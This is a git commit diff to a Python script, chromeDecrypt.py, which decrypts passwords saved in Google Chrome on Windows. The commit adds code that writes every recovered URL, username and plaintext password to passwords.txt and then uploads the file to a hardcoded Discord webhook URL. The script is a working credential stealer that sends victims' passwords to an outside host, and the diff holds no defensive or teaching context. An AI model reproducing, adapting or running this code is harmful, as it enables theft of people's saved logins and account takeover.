16942b8cee427672e74a02ba000120d982b720ac
vpq5kd <vpq5kd@virginia.edu>
2024-04-09 16:40:54 -0400

    creates file, sends to discord

--- chromeDecrypt.py
+++ chromeDecrypt.py
@@ -5,6 +5,7 @@ from Crypto.Cipher import AES
 import json
 import win32crypt
 import sys
+import requests
 #Chrome username & password file path
 keyFile = f"C:\\Users\\{sys.argv[1]}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"
 chrome_path_login_db = f"C:\\Users\\{sys.argv[1]}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
@@ -33,25 +34,49 @@ def get_secret_key():
         return None
 
 secretKey = get_secret_key()
+with open('passwords.txt',"w") as file:
+    file.close()
 
 for index,login in enumerate(cursor.fetchall()):
-    url = login[0]
-    username = login[1]
-    ciphertext= login[2]
-    if (url):
-        print("Url: ",url)
-    if (username):
-        print("Username: ",username)
-    # Step 1: Extracting initilisation vector from ciphertext
-    initialisation_vector = ciphertext[3:15]
-    # Step 2: Extracting encrypted password from ciphertext
-    encrypted_password = ciphertext[15:-16]
-    # Step 3:Build the AES algorithm to decrypt the password
-    cipher = AES.new(secretKey, AES.MODE_GCM, initialisation_vector)
-    decrypted_pass = cipher.decrypt(encrypted_password)
-    decrypted_pass = decrypted_pass.decode()
-    # Step 4: Decrypted Password
-    if (decrypted_pass):
-        print(f"password: {decrypted_pass}")
-    if(url or username or decrypted_pass):
-        print("-----------------------")
+    with open('passwords.txt','a+') as file:
+        url = login[0]
+        username = login[1]
+        ciphertext= login[2]
+        if (url):
+            file.write(f"Url: {url}\n")
+            print("Url: ",url)
+        if (username):
+            file.write(f"Username: {username}\n")
+            print("Username: ",username)
+        # Step 1: Extracting initilisation vector from ciphertext
+        initialisation_vector = ciphertext[3:15]
+        # Step 2: Extracting encrypted password from ciphertext
+        encrypted_password = ciphertext[15:-16]
+        # Step 3:Build the AES algorithm to decrypt the password
+        cipher = AES.new(secretKey, AES.MODE_GCM, initialisation_vector)
+        decrypted_pass = cipher.decrypt(encrypted_password)
+        decrypted_pass = decrypted_pass.decode()
+        # Step 4: Decrypted Password
+        if (decrypted_pass):
+            file.write(f"password: {decrypted_pass}\n")
+            print(f"password: {decrypted_pass}")
+        if(url or username or decrypted_pass):
+            file.write("-----------------------\n")
+            print("-----------------------")
+        file.flush()
+webhook_url = 'https://discord.com/api/webhooks/1213302044463595540/83yuwuv9NP--2PXjOQR7iOJhJ8dUUFbuhBTO7AnJVFo-EeVvFGwuDLTec59DAJwFM3sO'
+file_path = 'passwords.txt'
+
+with open(file_path, 'rb') as file:
+    file_content = file.read()
+
+#payload = {'file': file_content}
+files = {
+    'file': ('./passwords.txt', open('passwords.txt', 'rb')),
+}
+response = requests.post(webhook_url, files=files)
+
+if response.status_code == 200:
+    print('File uploaded successfully!')
+else:
+    print(f'Failed to upload file: {response.status_code}')
